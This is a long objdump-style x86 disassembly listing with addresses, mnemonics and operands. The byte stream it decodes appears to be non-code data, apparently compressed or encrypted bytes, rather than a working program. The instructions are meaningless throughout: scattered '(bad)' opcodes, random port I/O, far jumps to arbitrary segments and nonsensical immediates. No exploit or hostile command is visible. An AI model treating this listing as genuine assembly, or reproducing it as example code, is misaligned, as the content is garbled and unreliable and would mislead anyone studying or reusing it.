  426615:	shr    DWORD PTR [eax],1
  426617:	fimul  WORD PTR [eax+eax*1+0x22]
  42661b:	jae    0x4265bb
  42661d:	in     al,dx
  42661e:	retf   0x9414
  426621:	pop    edx
  426622:	xchg   edi,eax
  426623:	aad    0xe3
  426625:	adc    ah,BYTE PTR [eax+0x67]
  426628:	f2xm1  
  42662a:	push   0x9222c02b
  42662f:	call   0xc0029f49
  426634:	(bad)  [edx]
  426636:	mov    cs,ebx
  426638:	or     eax,0x6a417b74
  42663d:	cmp    ebx,esp
  42663f:	mov    dh,0x27
  426641:	mov    ah,cl
  426643:	and    BYTE PTR [eax+0x1328dccc],dh
  426649:	jne    0x426676
  42664b:	out    0xa9,al
  42664d:	fnstcw WORD PTR [esi]
  42664f:	sub    al,0x50
  426651:	xchg   ebx,eax
  426652:	lock test DWORD PTR [edx],0xcf58ea4
  426659:	sub    eax,0x6ab38186
  42665e:	sub    al,0x77
  426661:	loope  0x4265f7
  426663:	pushf  
  426664:	push   es
  426665:	pop    ecx
  426666:	test   DWORD PTR [edx],ebx
  426668:	out    dx,al
  426669:	and    eax,0xca86fcc3
  42666e:	mov    edx,0xdcbd754d
  426673:	push   ebx
  426674:	mov    al,0x74
  426676:	cmp    al,0x7c
  426678:	adc    eax,0x1bbd9672
  42667d:	mov    ebp,0x5f62fc9b
  426682:	pop    ebp
  426683:	out    0x6b,al
  426685:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426686:	mov    edx,0xbf48c328
  42668b:	inc    ebx
  42668c:	test   al,0xef
  42668e:	mul    edi
  426690:	jb     0x4266a5
  426692:	mov    al,0xd6
  426694:	xchg   edx,eax
  426695:	or     ebp,DWORD PTR [ecx+0x63]
  426698:	fdivr  QWORD PTR [edi+ebx*4]
  42669b:	cli    
  42669c:	push   edx
  42669d:	push   esi
  42669e:	or     BYTE PTR [ebp+0x384f5e2],ah
  4266a4:	int3   
  4266a5:	or     BYTE PTR [ebp-0x59],0x5b
  4266a9:	sbb    BYTE PTR [ecx+0x7c7bde4d],cl
  4266af:	dec    edx
  4266b0:	pusha  
  4266b1:	dec    esp
  4266b2:	xor    al,0x94
  4266b4:	ja     0x4266bc
  4266b6:	sbb    eax,ecx
  4266b8:	shl    DWORD PTR [ecx+eax*8-0xf3bfd3a],0x71
  4266c0:	add    bh,dl
  4266c2:	into   
  4266c3:	data16 sahf 
  4266c5:	adc    ecx,DWORD PTR [edi-0x3150c1dd]
  4266cb:	dec    eax
  4266cc:	(bad)  
  4266d0:	mov    esp,DWORD PTR [ebx+0x3e]
  4266d3:	xor    DWORD PTR [esi+0x77b83a0d],ecx
  4266d9:	pusha  
  4266da:	(bad)  
  4266db:	lds    edx,FWORD PTR [edi-0x4350f328]
  4266e1:	and    eax,0xbbb57b4b
  4266e6:	mov    al,ds:0x50eebd6c
  4266eb:	iret   
  4266ec:	pop    esi
  4266ed:	and    BYTE PTR [edx],0x6b
  4266f0:	and    al,0x7a
  4266f2:	adc    eax,DWORD PTR [ecx-0x3c]
  4266f5:	and    BYTE PTR [edi-0x73],bl
  4266f8:	call   0xf0fe78e5
  4266fd:	fsub   st,st(5)
  4266ff:	test   BYTE PTR [ebx+eax*2],0x11
  426703:	(bad)  
  426704:	sub    al,0x3c
  426706:	adc    DWORD PTR [edi-0x79],ebx
  426709:	xor    ah,BYTE PTR [ecx+0x32]
  42670c:	mov    dl,0xed
  42670e:	cmp    al,0x40
  426710:	pop    esi
  426711:	and    eax,0xb12bf583
  426716:	dec    ecx
  426717:	fdivr  DWORD PTR [eax-0x2227e18b]
  42671d:	mov    bl,0x50
  42671f:	repz xor DWORD PTR [edx-0x74e6c23],ebx
  426726:	mov    dh,0x7f
  426728:	test   al,0xd6
  42672a:	jae    0x426794
  42672c:	push   0xf78be69b
  426731:	nop
  426732:	mov    ecx,0x4dca17e4
  426737:	loop   0x4266db
  426739:	or     dh,BYTE PTR [ebx+0x424e6748]
  42673f:	inc    ebx
  426740:	jne    0x4266fd
  426742:	push   0x58
  426744:	imul   edx,DWORD PTR [eax+0x0],0xd78f5929
  42674b:	int    0x6c
  42674d:	jmp    0x1d9c:0xec56966d
  426754:	cwde   
  426755:	cmp    al,0x21
  426757:	in     eax,dx
  426758:	xor    al,0x4
  42675a:	jle    0x42676a
  42675c:	out    0xb,al
  42675e:	ror    DWORD PTR [edx],1
  426760:	xchg   ah,al
  426762:	or     al,0x8b
  426764:	or     BYTE PTR [edx+0x4e6d2819],dh
  42676a:	adc    ah,cl
  42676c:	mov    ecx,DWORD PTR [esp+ecx*4]
  42676f:	gs retw 
  426772:	scas   eax,DWORD PTR es:[edi]
  426773:	push   ecx
  426774:	and    DWORD PTR [ebp-0x4b8eb55a],ecx
  42677a:	lods   eax,DWORD PTR ds:[esi]
  42677b:	aas    
  42677c:	(bad)  
  42677d:	shl    DWORD PTR [eax+ebp*2+0x19],1
  426781:	jmp    DWORD PTR [edi+0x25]
  426784:	ja     0x4267a4
  426786:	mov    ds:0x89b9d80a,al
  42678b:	popa   
  42678c:	mov    DWORD PTR [ecx],esi
  42678e:	sahf   
  42678f:	xchg   edi,eax
  426790:	lahf   
  426791:	cdq    
  426792:	lock leave 
  426794:	mov    cl,0x67
  426796:	ret    0x8ab7
  426799:	pop    ds
  42679a:	call   0xcba4:0xeb0155c5
  4267a1:	scas   eax,DWORD PTR es:[edi]
  4267a2:	inc    ebx
  4267a3:	repz add dl,dl
  4267a6:	and    eax,0xfbd3177f
  4267ab:	mov    al,ds:0xbca3
	...
  4267b8:	add    BYTE PTR [eax],al
  4267ba:	mov    al,0x8a
  4267bc:	call   0xfa266242
  4267c1:	mov    ebx,0xcae72888
  4267c6:	fsub   st,st(4)
  4267c8:	xor    eax,0x1de5053
  4267cd:	add    ah,bh
  4267cf:	add    DWORD PTR [eax],eax
  4267d1:	add    al,bl
  4267d3:	shl    bh,0xef
  4267d6:	jmp    0x752:0xf608a7c2
  4267dd:	inc    eax
  4267de:	fisubr WORD PTR [ecx+0x7e62f0a1]
  4267e4:	jg     0x4267dc
  4267e6:	shl    DWORD PTR [ecx],1
  4267e8:	adc    DWORD PTR [esi],edx
  4267ea:	test   DWORD PTR [ecx+0x24],ebp
  4267ed:	mov    eax,ds:0xb9cc6b26
  4267f2:	sub    eax,0xac428dbc
  4267f7:	mov    eax,0x94545f42
  4267fc:	dec    edi
  4267fd:	xlat   BYTE PTR ds:[ebx]
  4267fe:	lahf   
  4267ff:	xor    ch,BYTE PTR [edx-0x50]
  426802:	push   ecx
  426803:	cld    
  426804:	je     0x42683b
  426806:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426807:	xchg   esi,eax
  426808:	mov    ah,0x3b
  42680a:	les    esp,FWORD PTR [eax-0x27d9386d]
  426810:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426811:	dec    esi
  426812:	in     al,0x13
  426814:	shr    DWORD PTR [eax+0x7b],cl
  426817:	retf   
  426818:	std    
  426819:	push   edx
  42681a:	popf   
  42681b:	pushf  
  42681c:	sbb    al,0x6f
  42681e:	(bad)  
  42681f:	cmp    DWORD PTR [ebp-0x14],ecx
  426822:	pop    sp
  426824:	mov    ch,0xeb
  426826:	ret    0x8b9c
  426829:	ds adc al,0x88
  42682c:	sub    al,0x4c
  42682e:	mov    dh,0x9d
  426830:	jp     0x4267b3
  426832:	and    DWORD PTR [ebx+0x41d73a1c],ecx
  426838:	fiadd  WORD PTR [ebx-0x4]
  42683b:	je     0x42681f
  42683d:	add    BYTE PTR [ecx-0x65],dl
  426840:	je     0x426828
  426842:	cmp    eax,0xd355a31d
  426847:	cmp    eax,0xb570e3d5
  42684c:	jo     0x426845
  42684e:	dec    esi
  42684f:	cmp    al,0xc5
  426851:	mov    al,0xdd
  426853:	popa   
  426854:	gs (bad) 
  426856:	mov    al,ds:0x13c27bbd
  42685b:	mov    eax,0xcf370f1a
  426860:	xor    dl,BYTE PTR [eax-0x7a]
  426863:	inc    edx
  426864:	cmp    eax,0x121fa00b
  426869:	push   0xcf4f8436
  42686e:	les    edi,FWORD PTR [edi+edi*8-0x27]
  426872:	rol    DWORD PTR [eax+0x4d],cl
  426875:	mov    al,0x73
  426877:	sub    al,BYTE PTR [edx+eax*2]
  42687a:	mov    esi,0x4a20a395
  42687f:	sub    DWORD PTR [edi+0x6f],ebx
  426882:	dec    ebp
  426883:	sbb    al,0xbc
  426885:	pop    ecx
  426886:	lea    ecx,[eax-0x26eb7f5b]
  42688c:	dec    esi
  42688d:	ins    BYTE PTR es:[edi],dx
  42688e:	in     eax,dx
  42688f:	sbb    bl,cl
  426891:	addr16 ss jnp 0x4268b9
  426895:	lods   eax,DWORD PTR ds:[esi]
  426896:	pop    ebx
  426897:	xor    al,BYTE PTR [ecx-0x48c95cde]
  42689d:	mov    ecx,0x837a8b57
  4268a2:	inc    edx
  4268a3:	push   es
  4268a4:	nop
  4268a5:	les    ebx,FWORD PTR [esi-0x55]
  4268a8:	jne    0x426911
  4268aa:	add    edx,edx
  4268ac:	xor    BYTE PTR [eax],dh
  4268ae:	sub    eax,0x3e0e7c86
  4268b3:	mov    dl,0x79
  4268b5:	push   eax
  4268b6:	xchg   ecx,eax
  4268b7:	mov    esi,0x8f481fac
  4268bc:	jg     0x4268cf
  4268be:	push   ss
  4268bf:	repz ds dec eax
  4268c2:	call   0x5797:0x590e1188
  4268c9:	mov    edx,0x5075c16
  4268ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268cf:	xor    BYTE PTR [edx+0x30971a09],0xd6
  4268d6:	stos   DWORD PTR es:[edi],eax
  4268d7:	mov    ecx,0x9e51bf43
  4268dc:	cdq    
  4268dd:	xchg   DWORD PTR [ecx-0x45d217ed],ebx
  4268e3:	jge    0x4268b8
  4268e5:	jp     0x4268c5
  4268e7:	mov    ebx,0xb8630298
  4268ec:	mov    edi,0xca8f1882
  4268f1:	imul   ebx,DWORD PTR [ebx-0x1f5d376d],0xffffffbf
  4268f8:	jl     0x4268db
  4268fa:	popa   
  4268fb:	cli    
  4268fc:	jecxz  0x426899
  4268fe:	test   al,0xa6
  426900:	jmp    ebp
  426902:	xchg   edx,eax
  426903:	pop    ecx
  426904:	test   BYTE PTR [edi-0x636d7c1c],al
  42690a:	and    edx,DWORD PTR [eax+0x3f]
  42690d:	(bad)  
  42690e:	iret   
  42690f:	jg     0x426960
  426911:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426912:	sub    eax,0xbeb00992
  426917:	ins    BYTE PTR es:[edi],dx
  426918:	sar    BYTE PTR [eax+0x1e2b8c6d],cl
  42691e:	jno    0x426900
  426920:	mov    edi,0xfd9ec2ee
  426925:	sub    DWORD PTR [edx+0x69491a72],0x744a6e1c
  42692f:	je     0x426918
  426931:	mov    ds:0x1cc1811e,al
  426936:	mov    edi,0x7afa64bd
  42693b:	and    ch,bh
  42693d:	rol    BYTE PTR [esi+0x6ba82ec7],cl
  426943:	mul    BYTE PTR [edi+0x7abe717e]
  426949:	xchg   edi,eax
  42694a:	fbstp  TBYTE PTR [eax-0x39]
  42694d:	jecxz  0x426920
  42694f:	ins    DWORD PTR es:[edi],dx
  426950:	pop    edx
  426951:	push   ebx
  426952:	aas    
  426953:	mov    eax,ds:0x4e31bcc7
  426958:	xor    BYTE PTR [esi-0x5c5b6b55],cl
  42695e:	or     esp,ebx
  426960:	ins    BYTE PTR es:[edi],dx
  426961:	push   eax
  426962:	sar    DWORD PTR [ecx-0xfd66745],1
  426968:	into   
  426969:	rcl    BYTE PTR [ebp-0x5789b68d],0xce
  426970:	mov    ecx,0xa0d7a6c4
  426975:	lock add esi,esp
  426978:	mov    edx,0x73397b09
  42697d:	repz sub ecx,DWORD PTR [esi]
  426980:	enter  0x7a3e,0x3f
  426984:	xor    al,0xf
  426986:	jb     0x426a00
  426988:	shl    BYTE PTR [ecx+0x627b5775],0xd6
  42698f:	fdivr  st(7),st
  426991:	fild   DWORD PTR ds:0x453c2e9f
  426997:	mov    esi,0xccc95808
  42699c:	gs sub dh,ah
  42699f:	in     al,dx
  4269a0:	aas    
  4269a1:	arpl   WORD PTR [edi+0x63],bp
  4269a4:	scas   al,BYTE PTR es:[edi]
  4269a5:	jbe    0x42699d
  4269a7:	cmp    esp,DWORD PTR [edi-0x22]
  4269aa:	sub    al,0x8d
  4269ac:	xchg   DWORD PTR [esi],ebp
  4269ae:	jno    0x426995
  4269b0:	inc    esp
  4269b1:	sub    dh,BYTE PTR [esi+0x46]
  4269b4:	pop    es
  4269b5:	aad    0x72
  4269b7:	cmp    DWORD PTR [eax+esi*1],esp
  4269ba:	sub    al,0xaf
  4269bc:	into   
  4269bd:	out    dx,eax
  4269be:	sbb    DWORD PTR [eax+0x3dd9a819],ebp
  4269c4:	push   edi
  4269c5:	sub    eax,0x986eff38
  4269ca:	pop    ecx
  4269cb:	push   0xffffffe2
  4269cd:	fadd   DWORD PTR [eax]
	...
  4269d7:	add    BYTE PTR [eax],al
  4269d9:	add    BYTE PTR [edx-0x39253b74],cl
  4269df:	ficomp DWORD PTR [esi+0xc235fdc]
  4269e5:	mov    al,BYTE PTR [ebx-0x13]
  4269e8:	and    DWORD PTR [ebp+0x4c],edi
  4269eb:	loopne 0x4269ee
  4269ed:	add    ah,bh
  4269ef:	add    DWORD PTR [eax],eax
  4269f1:	add    cl,dh
  4269f3:	dec    ecx
  4269f4:	mov    al,ds:0xb98ecb4c
  4269f9:	mov    dl,0xf0
  4269fb:	or     BYTE PTR [edi+0x1a305cde],bl
  426a01:	cmp    al,0xdd
  426a03:	loope  0x42698e
  426a05:	mov    edi,0x5b5bccf9
  426a0a:	inc    edi
  426a0b:	mov    ah,0x8c
  426a0d:	push   ecx
  426a0e:	push   cs
  426a0f:	cmc    
  426a10:	(bad)  
  426a11:	cld    
  426a12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426a13:	mov    ds:0xc0daecbe,al
  426a18:	mov    ds:0x37fb2ef8,al
  426a1d:	jne    0x426a10
  426a1f:	lea    esp,[esi]
  426a21:	int    0x9c
  426a23:	addr16 xchg edx,eax
  426a25:	lods   eax,DWORD PTR ds:[esi]
  426a26:	cmp    esp,ebp
  426a28:	in     eax,0x17
  426a2a:	push   esp
  426a2b:	and    edi,esi
  426a2d:	mov    al,0x91
  426a2f:	mov    dh,0x45
  426a31:	ja     0x4269e0
  426a33:	into   
  426a34:	out    dx,eax
  426a35:	jae    0x426a03
  426a37:	hlt    
  426a38:	(bad)  
  426a3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a3b:	ja     0x4269c1
  426a3d:	or     DWORD PTR [ebx],0x89daa68e
  426a43:	sbb    DWORD PTR [edi-0x13a63045],esi
  426a49:	add    al,0xe7
  426a4b:	push   0xc
  426a4d:	lock call 0xf530:0x1b38472
  426a55:	mov    ds:0x9eb247cf,al
  426a5a:	mov    ds:0xf74c04a0,al
  426a5f:	add    BYTE PTR [edx],ch
  426a61:	or     al,0xcb
  426a63:	sbb    eax,0x523b22
  426a68:	mov    ebx,0xb735fe6f
  426a6d:	repnz popa 
  426a6f:	pop    esp
  426a70:	lds    ebp,FWORD PTR [edi+ebp*1]
  426a73:	sub    eax,DWORD PTR [ebx]
  426a75:	fstp   DWORD PTR [edx+0x5bfad02d]
  426a7b:	out    dx,al
  426a7c:	sahf   
  426a7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426a7e:	push   ss
  426a7f:	in     al,0xc6
  426a81:	mov    edi,0x5d7ab8b9
  426a86:	lea    edi,[edx-0x3]
  426a89:	pop    ebx
  426a8a:	dec    ebp
  426a8b:	xor    BYTE PTR [ecx],cl
  426a8d:	adc    BYTE PTR [edi-0x762b60a6],bh
  426a93:	mov    ebp,0xe46e7dd0
  426a98:	mov    al,ds:0xccf825f1
  426a9d:	(bad)  
  426a9e:	and    esp,DWORD PTR [edx]
  426aa0:	add    eax,0x4b8bcf72
  426aa5:	jo     0x426a52
  426aa7:	call   0x48563e9c
  426aac:	dec    ebp
  426aad:	dec    ebx
  426aae:	outs   dx,BYTE PTR ds:[esi]
  426aaf:	xor    esp,ecx
  426ab1:	enter  0x8c56,0x9f
  426ab5:	in     eax,0x2f
  426ab7:	retf   0x9467
  426aba:	dec    edi
  426abb:	pop    ecx
  426abc:	fisttp QWORD PTR [edx+0xaaff646]
  426ac2:	clc    
  426ac3:	jmp    0x426ae5
  426ac5:	mov    BYTE PTR [ecx-0x4b],dl
  426ac8:	jl     0x426aba
  426aca:	cld    
  426acb:	push   cs
  426acc:	nop
  426acd:	pop    ebx
  426ace:	mov    DWORD PTR [esi-0x63acb34d],0x44fce386
  426ad8:	or     DWORD PTR [ebx-0x69],0xffffffc7
  426adc:	adc    ecx,edx
  426ade:	pop    edi
  426adf:	jns    0x426aa1
  426ae1:	push   edx
  426ae2:	data16 loopne 0x426b13
  426ae5:	dec    ecx
  426ae6:	inc    ebx
  426ae7:	pop    edi
  426ae8:	adc    bh,bl
  426aea:	retf   0xd168
  426aed:	(bad)  [ebx+0x32b1635]
  426af3:	adc    BYTE PTR [ebp+0x44ba44e4],0x3c
  426afa:	scas   eax,DWORD PTR es:[edi]
  426afb:	and    esp,edi
  426afd:	gs xchg edi,eax
  426aff:	in     al,0xe1
  426b01:	icebp  
  426b02:	loop   0x426ae6
  426b04:	popa   
  426b05:	ds pop ebp
  426b07:	mov    ch,0xfe
  426b09:	adc    ecx,DWORD PTR [ecx]
  426b0b:	lods   al,BYTE PTR ds:[esi]
  426b0c:	shl    esp,cl
  426b0e:	mov    al,0xb3
  426b10:	int3   
  426b11:	out    dx,al
  426b12:	test   BYTE PTR [eax-0x696e8b24],al
  426b18:	xchg   dh,dh
  426b1a:	pop    ebp
  426b1b:	pop    esp
  426b1c:	pusha  
  426b1d:	or     ebx,DWORD PTR [ebp+0x45]
  426b20:	(bad)  
  426b21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426b22:	imul   esp,DWORD PTR [ebp+0x7b1b7f1a],0x91d5b33e
  426b2c:	popa   
  426b2d:	(bad)  
  426b2e:	bound  esi,QWORD PTR ds:0x8b810383
  426b34:	les    eax,FWORD PTR [esp+ecx*8-0x2ec26f88]
  426b3b:	mov    esp,0x57265c00
  426b40:	xchg   BYTE PTR [ecx+0x1857d958],bl
  426b46:	add    dh,BYTE PTR [edi]
  426b48:	or     DWORD PTR [ebp-0x6a],edx
  426b4b:	mov    cl,0xc6
  426b4d:	cli    
  426b4e:	(bad)  [ebx-0x3b5d321a]
  426b54:	mov    dl,bh
  426b56:	aaa    
  426b57:	mov    dh,BYTE PTR [edx+0x43]
  426b5a:	lods   al,BYTE PTR ds:[esi]
  426b5b:	xchg   ebx,eax
  426b5c:	int    0x27
  426b5e:	dec    esp
  426b5f:	sub    esp,DWORD PTR [edx]
  426b61:	pop    eax
  426b62:	test   al,0x92
  426b64:	jge    0x426b56
  426b66:	dec    edi
  426b67:	mov    ebx,0x91a85c17
  426b6c:	cmp    eax,0x63b78905
  426b71:	mov    ch,0x40
  426b73:	test   BYTE PTR [ebx],bh
  426b75:	imul   esi,ebx,0xc1ec936
  426b7b:	push   cs
  426b7c:	icebp  
  426b7d:	xor    DWORD PTR ss:[edx],eax
  426b80:	lods   al,BYTE PTR ds:[esi]
  426b81:	popa   
  426b82:	mov    ebx,0xcf3ce3c3
  426b87:	jl     0x426b9e
  426b89:	shl    DWORD PTR [edi+0x25],cl
  426b8c:	call   DWORD PTR [edi-0x27e86e6e]
  426b92:	add    DWORD PTR [ecx],ebp
  426b94:	bound  esp,QWORD PTR [ecx+ebp*1-0x77]
  426b98:	out    dx,al
  426b99:	lahf   
  426b9a:	(bad)  [ecx]
  426b9c:	sub    eax,0x7838b5de
  426ba1:	mov    bh,0xd2
  426ba3:	mov    bl,0x97
  426ba5:	aaa    
  426ba6:	rcl    DWORD PTR [ebx+ebx*1+0x7d],1
  426baa:	xor    dh,BYTE PTR [edi-0x6c]
  426bad:	hlt    
  426bae:	je     0x426b84
  426bb0:	or     BYTE PTR [eax],0x8a
  426bb3:	sub    eax,0x4e3243a1
  426bb8:	je     0x426b5a
  426bba:	shl    DWORD PTR [edx-0x6ffb4e8f],cl
  426bc0:	loopne 0x426c30
  426bc2:	cli    
  426bc3:	jb     0x426b6f
  426bc5:	int    0x15
  426bc7:	jmp    FWORD PTR [edi+edx*8+0x579b08c0]
  426bce:	mov    BYTE PTR [ecx+eax*1-0x4a],al
  426bd2:	icebp  
  426bd3:	mov    dl,0xab
  426bd5:	das    
  426bd6:	int    0xb3
  426bd8:	into   
  426bd9:	dec    ecx
  426bda:	and    DWORD PTR [edx+0x44d18d68],ebx
  426be0:	push   ds
  426be1:	pop    ecx
  426be2:	das    
  426be3:	add    ch,ch
  426be5:	mov    edi,0x9c0230f9
  426bea:	clc    
  426beb:	clc    
  426bec:	ds stc 
	...
  426bfa:	inc    eax
  426bfb:	stos   BYTE PTR es:[edi],al
  426bfc:	pop    edx
  426bfd:	sbb    bh,dl
  426bff:	cli    
  426c00:	inc    eax
  426c01:	cli    
  426c02:	mov    ds:0xd8fe433f,al
  426c07:	repnz (bad) 
  426c09:	push   ss
  426c0a:	dec    eax
  426c0b:	loop   0x426c0e
  426c0d:	add    ah,bh
  426c0f:	add    DWORD PTR [eax],eax
  426c11:	add    BYTE PTR [edi+eax*2+0x274b31e4],bh
  426c18:	dec    ebx
  426c19:	dec    esi
  426c1a:	cmp    BYTE PTR [edx+0x7e],0xcf
  426c1e:	pop    edx
  426c1f:	retf   
  426c20:	sbb    esp,esi
  426c22:	test   al,al
  426c24:	mov    ds:0x78f7b0fb,al
  426c29:	in     al,dx
  426c2a:	inc    esi
  426c2b:	dec    edi
  426c2c:	cmp    eax,0xa3722456
  426c31:	cmp    BYTE PTR [esi+0x12],ah
  426c34:	dec    esi
  426c35:	out    0x5a,al
  426c37:	xlat   BYTE PTR ds:[ebx]
  426c38:	push   eax
  426c39:	sbb    ah,BYTE PTR [edx]
  426c3b:	push   ds
  426c3c:	pop    ebx
  426c3d:	stos   DWORD PTR es:[edi],eax
  426c3e:	cwde   
  426c3f:	mov    ah,0x8b
  426c41:	(bad)  
  426c42:	idiv   BYTE PTR [ebp-0x26085c25]
  426c48:	test   eax,0xcea82007
  426c4d:	fwait
  426c4e:	add    eax,0xfac376f5
  426c53:	shl    edx,0xdf
  426c56:	into   
  426c57:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  426c59:	in     eax,dx
  426c5a:	mov    ebx,0x4a432949
  426c5f:	int3   
  426c60:	inc    ebx
  426c61:	mov    ecx,0x9d8ba1d5
  426c66:	cdq    
  426c67:	std    
  426c68:	fdivrp st(0),st
  426c6a:	aas    
  426c6b:	sub    edi,DWORD PTR [esi+0x4b]
  426c6e:	cwde   
  426c6f:	jge    0x426c23
  426c71:	lods   eax,DWORD PTR ds:[esi]
  426c72:	push   eax
  426c73:	inc    esp
  426c74:	cmp    al,0xeb
  426c76:	lock pop edx
  426c78:	or     esp,esp
  426c7a:	push   cs
  426c7b:	jo     0x426ca3
  426c7d:	push   eax
  426c7e:	(bad)  
  426c7f:	mov    cl,0xbb
  426c81:	enter  0x72b1,0xdd
  426c85:	fcom   QWORD PTR [ecx-0x1a]
  426c88:	test   BYTE PTR [eax+edi*8-0x6b26854d],cl
  426c8f:	es out 0x5b,eax
  426c92:	or     cl,BYTE PTR [ecx]
  426c94:	sub    DWORD PTR [edi-0x5e],ebp
  426c97:	push   cs
  426c98:	dec    ecx
  426c99:	push   edx
  426c9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426c9b:	lods   al,BYTE PTR ds:[esi]
  426c9c:	or     cl,BYTE PTR [ebp-0x30]
  426c9f:	pop    ebp
  426ca0:	fidivr DWORD PTR [edi+0x1b]
  426ca3:	jle    0x426c6b
  426ca5:	rcr    DWORD PTR [ebp-0x31],0x51
  426ca9:	dec    ecx
  426caa:	xor    esp,DWORD PTR [esi+eiz*8-0x6ad9992b]
  426cb1:	or     BYTE PTR [edx],dh
  426cb3:	int3   
  426cb4:	jo     0x426c56
  426cb6:	fimul  WORD PTR [ebx-0x51]
  426cb9:	push   ebp
  426cba:	test   eax,0x93728c1
  426cbf:	bndldx bnd0,[esi+0x78]
  426cc3:	adc    BYTE PTR [edi],bl
  426cc5:	iret   
  426cc6:	xor    dl,ch
  426cc8:	jg     0x426d35
  426cca:	dec    edi
  426ccb:	pop    ds
  426ccc:	pop    es
  426ccd:	(bad)  
  426ccf:	lock cmp al,0xf6
  426cd2:	stos   BYTE PTR es:[edi],al
  426cd3:	mov    DWORD PTR [ebx],esp
  426cd5:	xchg   BYTE PTR [esp+ebx*4+0x52a61e4b],dl
  426cdc:	fcmove st,st(0)
  426cde:	sub    al,0xca
  426ce0:	cli    
  426ce1:	and    DWORD PTR [edx],ecx
  426ce3:	fistp  DWORD PTR ds:0x8c38da2c
  426ce9:	out    0x14,al
  426ceb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426cec:	(bad)  
  426ced:	lea    esi,[edx+ebx*1-0x4e]
  426cf1:	inc    ebx
  426cf2:	retf   0x72c2
  426cf5:	fstp   DWORD PTR [esp+edi*2+0x7107e8a2]
  426cfc:	mov    al,ds:0xb71f5ec1
  426d01:	xlat   BYTE PTR ds:[ebx]
  426d02:	in     eax,dx
  426d03:	jg     0x426cc5
  426d05:	in     al,0x1c
  426d07:	aas    
  426d08:	sub    al,0xc6
  426d0a:	xchg   ecx,eax
  426d0b:	mov    ds:0x826774d8,eax
  426d10:	inc    esi
  426d11:	mov    cl,0xe2
  426d13:	cmp    dh,BYTE PTR [esi]
  426d15:	xchg   esp,eax
  426d16:	cmp    ebp,DWORD PTR [esi]
  426d18:	xor    DWORD PTR [edx+0x2c414c41],ecx
  426d1e:	adc    esi,eax
  426d20:	lock loop 0x426d09
  426d23:	push   0xffffff8e
  426d25:	je     0x426d4a
  426d27:	icebp  
  426d28:	aam    0x1a
  426d2a:	jecxz  0x426cf2
  426d2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426d2d:	xchg   esp,eax
  426d2e:	jle    0x426d86
  426d30:	packsswb mm4,QWORD PTR [edx-0x76]
  426d34:	or     ebp,DWORD PTR [esi-0x14]
  426d37:	fnstsw WORD PTR [ecx]
  426d39:	inc    ebx
  426d3a:	(bad)  
  426d3c:	and    al,0xc8
  426d3e:	lea    eax,[ebp-0xb]
  426d41:	xor    ecx,0x71dae7a2
  426d47:	imul   esp,edi,0x8d0c6a16
  426d4d:	aad    0x2
  426d4f:	mov    esp,0x850e3a8e
  426d54:	out    dx,eax
  426d55:	inc    esi
  426d56:	add    ebp,DWORD PTR [esi]
  426d58:	sbb    ecx,DWORD PTR fs:[ebx+0x32]
  426d5c:	out    dx,eax
  426d5d:	push   0xeaa0338a
  426d62:	cli    
  426d63:	jb     0x426d8a
  426d65:	out    dx,eax
  426d66:	sub    ebx,DWORD PTR ds:0x22ff9520
  426d6c:	pop    ebp
  426d6d:	shr    esi,0x98
  426d70:	test   eax,0x9f9ad327
  426d75:	adc    ecx,ebx
  426d77:	test   BYTE PTR [edx+0x2b03bb14],0x67
  426d7e:	push   esi
  426d7f:	mov    edi,0xab86b112
  426d85:	add    DWORD PTR [ebp-0x55e41a95],ebp
  426d8b:	or     eax,0x3290c6d7
  426d90:	sahf   
  426d91:	sbb    edi,eax
  426d93:	pop    esp
  426d94:	sahf   
  426d95:	(bad)  
  426d96:	shr    BYTE PTR gs:[edi-0xfa626ec],cl
  426d9d:	pop    ss
  426d9e:	icebp  
  426d9f:	cmp    ebp,DWORD PTR [esi]
  426da1:	xor    eax,0x6aba3d8d
  426da6:	push   0x3f0dcb1
  426dab:	push   eax
  426dac:	and    eax,0xd4b705f8
  426db1:	push   ds
  426db2:	mov    ebp,0x5b501ffe
  426db7:	xchg   ebx,eax
  426db8:	sbb    BYTE PTR [edx+0x35],ch
  426dbb:	(bad)  
  426dbc:	mov    cl,cl
  426dbe:	pop    es
  426dbf:	ins    DWORD PTR es:[edi],dx
  426dc0:	stos   BYTE PTR es:[edi],al
  426dc1:	aad    0x7
  426dc3:	pop    esp
  426dc4:	ins    BYTE PTR es:[edi],dx
  426dc5:	jl     0x426e22
  426dc7:	and    bh,BYTE PTR [edi-0x6f312605]
  426dcd:	xor    ecx,eax
  426dcf:	in     eax,0xea
  426dd1:	fwait
  426dd2:	sub    eax,0xf326170f
  426dd7:	js     0x426d94
  426dd9:	leave  
  426dda:	mov    ebp,0x7ae4c0e3
  426ddf:	xor    al,0x86
  426de1:	jge    0x426d69
  426de3:	push   0xee9dbeeb
  426de8:	pop    edi
  426de9:	popa   
  426dea:	nop
  426deb:	xor    al,0xa6
  426ded:	inc    edi
  426dee:	scas   eax,DWORD PTR es:[edi]
  426def:	mov    eax,0x6af7363
  426df4:	xchg   edx,eax
  426df5:	imul   ebp,DWORD PTR [ebp+0x34989989],0x55a80d7d
  426dff:	mov    esp,ds
  426e01:	leave  
  426e02:	cmc    
  426e03:	xor    DWORD PTR [ebp+0x70984a5b],eax
  426e09:	jp     0x426e89
  426e0b:	(bad)  
  426e0c:	jecxz  0x426e4e
	...
  426e1a:	mov    dh,0xe4
  426e1c:	xlat   BYTE PTR ds:[ebx]
  426e1d:	push   esp
  426e1e:	xlat   BYTE PTR ds:[ebx]
  426e1f:	ja     0x426dd8
  426e21:	out    0x39,al
  426e23:	(bad)  
  426e24:	push   ebx
  426e25:	lahf   
  426e26:	jge    0x426de4
  426e28:	fisttp WORD PTR [ebp+0x1e444]
  426e2e:	cld    
  426e2f:	add    DWORD PTR [eax],eax
  426e31:	add    BYTE PTR [ecx-0x75],dh
